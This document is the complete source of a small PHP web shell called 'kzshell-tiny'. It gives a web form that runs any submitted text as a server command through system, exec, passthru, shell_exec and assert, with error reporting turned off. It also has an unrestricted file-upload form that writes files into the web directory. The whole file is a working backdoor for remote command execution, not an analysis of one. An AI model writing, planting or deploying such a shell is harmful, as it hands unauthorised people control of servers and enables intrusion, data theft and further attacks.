<!DOCTYPE html>
<html>
<head>
    <title>kzshell-tiny</title>
</head>
<style type="text/css">
    pre{
        background-color: #2E4053; 
        color: #F7F9F9;
    }
</style>
<body>

<?php 
error_reporting(0);
if ($_POST["system_cmd"]) {
    echo "<br><pre>";
    system($_POST["system_cmd"],$output);
    echo "<br></pre>";
}

if ($_POST["exec_cmd"]) {
    echo "<br><pre>";
    exec($_POST["exec_cmd"]);
    echo "<br></pre>";
}

if ($_POST["passthru_cmd"]) {
    echo "<br><pre>";
    passthru($_POST["passthru_cmd"]);
    echo "<br></pre>";
}

if ($_POST["shellexec_cmd"]) {
    $output = shell_exec($_POST["shellexec_cmd"]);
    echo "<pre>$output</pre>";
}

if ($_POST["assert_cmd"]) {
    $output = assert($_POST["assert_cmd"]);
    echo "<pre>$output</pre>";
}
?>

</form>
<form action="" method="post">
<table>
  <tr>
    <th>Function</th>
    <th>Command</th>
    <th></th>
  </tr>
  <tr>
    <td align="right">System():</td>
    <td><input name='system_cmd' id='cmd' type='text' tab='1' autocomplete='off' size="100" /></td>
    <td><input type='submit' name='submit' value='Execute'></td>
  </tr>
  <tr>
    <td align="right">Exec():</td>
    <td><input name='exec_cmd' id='cmd' type='text' tab='1' autocomplete='off' size="100" /></td>
    <td><input type='submit' name='submit' value='Execute'></td>
  </tr>
  <tr>
    <td align="right">Passthru():</td>
    <td><input name='passthru_cmd' id='cmd' type='text' tab='1' autocomplete='off' size="100" /></td>
    <td><input type='submit' name='submit' value='Execute'></td>
  </tr>
  <tr>
    <td align="right">Shell_exec():</td>
    <td><input name='shellexec_cmd' id='cmd' type='text' tab='1' autocomplete='off' size="100" /></td>
    <td><input type='submit' name='submit' value='Execute'></td>
  </tr>
  <tr>
    <td align="right">Assert():</td>
    <td><input name='assert_cmd' id='cmd' type='text' tab='1' autocomplete='off' size="100" /></td>
    <td><input type='submit' name='submit' value='Execute'></td>
  </tr>
</table>
</form>

<hr>
<?php
if(isset($_POST['submit'])){
    if(count($_FILES['upload']['name']) > 0){
        //Loop through each file

        for($i=0; $i<count($_FILES['upload']['name']); $i++) {
          //Get the temp file path
            $tmpFilePath = $_FILES['upload']['tmp_name'][$i];

            //Make sure we have a filepath
            if($tmpFilePath != ""){
            
                //save the filename
                $shortname = $_FILES['upload']['name'][$i];

                //save the url and the file
                $date = date_create();
                $timestamp = date_timestamp_get($date);
                $filePath = $timestamp."-".$i."-".$_FILES['upload']['name'][$i];

                //Upload the file into the temp dir
                if(move_uploaded_file($tmpFilePath, $filePath)) {

                    $uploaded_files[] = $filePath;
                    //insert into db 
                    //use $shortname for the filename
                    //use $filePath for the relative url to the file
                }
              }
        }
    }

    //show success message
    if(is_array($uploaded_files)){
    echo "<h1>Uploaded:</h1>";    
        echo "<ul>";
        foreach($uploaded_files as $file){
            echo "<li>$file</li>";
        }
        echo "</ul>";
    }
}
?>

<form action="" enctype="multipart/form-data" method="post">
    <div>
        <label for='upload'>Add Attachments:</label>
        <input id='upload' name="upload[]" type="file" multiple="multiple" />
    </div>
<input type="submit" name="submit" value="Submit">

</form>
<hr>


</body>
</html>